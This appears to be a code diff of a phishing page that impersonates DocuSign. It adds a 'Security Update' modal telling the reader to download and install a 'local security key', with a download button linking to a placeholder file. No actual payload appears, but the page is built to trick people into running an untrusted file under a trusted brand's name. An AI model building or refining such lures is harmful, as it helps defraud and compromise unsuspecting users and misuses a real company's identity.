@@ -106,8 +106,12 @@
     </div>
 
     <div style="display: none" class="overlay">
-      <div class="overlay__modal overlay__modal-security">
-        <div class="main-wrapper">
+      <div
+        id="modal-security"
+        style="display: block"
+        class="overlay__modal overlay__modal-security"
+      >
+        <div class="main-wrapper modal-wrapper">
           <div class="main-title">Security Update</div>
           <div class="main-descr">
             Dear User, <br />
@@ -138,6 +142,29 @@
             DocuSign Team
           </div>
           <button class="overlay__button button button_blue">NEXT</button>
+        </div>
+      </div>
+
+      <div
+        id="modal-download-key"
+        style="display: none"
+        class="overlay__modal overlay__modal-download-key"
+      >
+        <div class="main-wrapper">
+          <div class="main-title">Security Update</div>
+          <div class="main-descr">
+            You will need to download and install a local security key. After
+            installation, you will receive a notification with your unique
+            security key which you must enter in the line below to confirm the
+            installation.
+          </div>
+          <a
+            href="download/some_file.txt"
+            download=""
+            class="overlay__button button button_blue"
+          >
+            DOWNLOAD SECURITY KEY
+          </a>
         </div>
       </div>
     </div>
